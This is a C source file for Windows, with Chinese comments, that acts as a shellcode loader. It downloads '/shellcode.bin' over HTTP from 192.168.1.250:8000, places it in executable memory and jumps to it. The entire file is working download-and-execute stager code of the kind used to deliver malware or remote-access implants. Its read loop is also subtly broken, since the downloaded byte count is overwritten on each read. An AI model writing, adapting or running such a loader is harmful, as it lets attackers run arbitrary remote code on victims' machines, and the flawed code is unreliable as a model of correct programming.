#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

char* DownloadShellcode( DWORD* size) {
    BOOL  bResults = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dataSize = 0; // 下载数据的大小
    DWORD dwDownloaded = 0;
    char* shellcode = NULL;

    // 指定目标URL，例如：L"http://192.168.1.250:8000/shellcode.bin"
    
    // 初始化WinHTTP Session
    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",  
                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME, 
                            WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        // 创建HTTP连接
        hConnect = WinHttpConnect(hSession, L"192.168.1.250", 8000, 0);
    }

    if (hConnect) {
        // 创建HTTP请求
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/shellcode.bin",
                                      NULL, WINHTTP_NO_REFERER, 
                                      WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                      0);
    }

    if (hRequest) {
        // 发送HTTP请求
        bResults = WinHttpSendRequest(hRequest,
                                      WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      WINHTTP_NO_REQUEST_DATA, 0, 
                                      0, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // 读取HTTP响应数据
    if (bResults) {
        do {
            // 检查可用数据
            dataSize = 0;
            WinHttpQueryDataAvailable(hRequest, &dataSize);

            // 分配内存
            shellcode = (char*)realloc(shellcode, dwDownloaded + dataSize);

            if (!shellcode) {
                printf("内存分配失败\n");
                break;
            }

            // 读取数据
            ZeroMemory(shellcode + dwDownloaded, dataSize);
            if (!WinHttpReadData(hRequest, (LPVOID)(shellcode + dwDownloaded), dataSize, &dwDownloaded)) {
                printf("读取数据失败\n");
                free(shellcode);
                shellcode = NULL;
                break;
            }

        } while (dataSize > 0);
    }

    // 关闭句柄
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    *size = dwDownloaded;
    return shellcode;
}


// 执行shellcode
void ExecuteShellcode(char *shellcode, unsigned int size) {
    // 确保申请足够的内存空间，这里的size应该至少为4MB
    void *exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("内存申请失败\n");
        return;
    }

    // 将shellcode复制到申请的内存区域
    memcpy(exec_mem, shellcode, size);

    // 转换函数指针并执行shellcode
    void (*func)() = (void (*)())exec_mem;
    func();
}


int main() {
    unsigned int size = 4194304;
    char *shellcode;


    shellcode = DownloadShellcode( &size);
    if(shellcode != NULL) {
        ExecuteShellcode(shellcode, size);
        free(shellcode);
    }

    return 0;
}
